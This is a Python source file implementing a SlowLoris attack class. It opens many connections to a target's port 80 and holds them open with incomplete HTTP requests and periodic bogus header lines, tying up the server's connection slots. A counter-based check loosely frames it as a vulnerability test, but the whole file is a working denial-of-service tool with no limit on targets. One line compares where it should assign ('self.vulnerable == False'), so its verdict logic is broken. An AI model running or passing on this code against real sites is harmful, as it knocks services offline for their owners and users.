import socket
import time
import random

class SlowLoris:
    def __init__(self, target, socketsNum: int,):

        self.target = target
        self.socketsNum = socketsNum
        self.headers = [
            "User-agent: Mozilla/5.0 (Linux; Android 10; SHV46) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Mobile Safari/537.36",
            "Accept-language: en-US,en"
        ]
        self.sockets = []
        self.vulnerable = None
        self.testing = True
        self.closedSockets = 0
        self.responsiveSockets = 0


    def setupSocket(self, ip):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(4)
        sock.connect((ip, 80))
        sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 9999)).encode("utf-8"))

        for header in self.headers:
            sock.send("{}\r\n".format(header).encode("UTF-8"))

        return sock

    def start(self):
        try:

            try:
                #get ip address
                ip = socket.gethostbyname("%s" %self.target)

            except:
                raise ValueError("website connot be reached. ensure you spelt it correctly")
            

            for i in range(int(self.socketsNum)):
                            
                try:
                    sock = self.setupSocket(ip)
                                
                except socket.error:
                    break

                self.sockets.append(sock)

            while self.testing:

                for sock in list(self.sockets):
                                
                    try:
                        sock.send("X-a: {}\r\n".format(random.randint(1, 4600)).encode("utf-8"))
                        self.responsiveSockets += 1
                                    
                    except socket.error:
                        self.sockets.remove(sock)

                for i in range(int(self.socketsNum) - len(self.sockets)):

                    #re-opening sockets
                    try:
                        sock = self.setupSocket(ip)
                                    
                        if sock:
                            self.sockets.append(sock)
                                        
                    except socket.error:
                        self.closedSockets += 1    
                                    

                if self.closedSockets == (int(self.socketsNum) / 2):
                    self.vulnerable == False
                    self.testing = False
                    break
                                        
                if self.responsiveSockets > (int(self.socketsNum) * 2):
                    self.vulnerable = True
                    self.testing = False
                    break
                                

                time.sleep(15)

        except Exception as e:
            raise ValueError(e)
                    
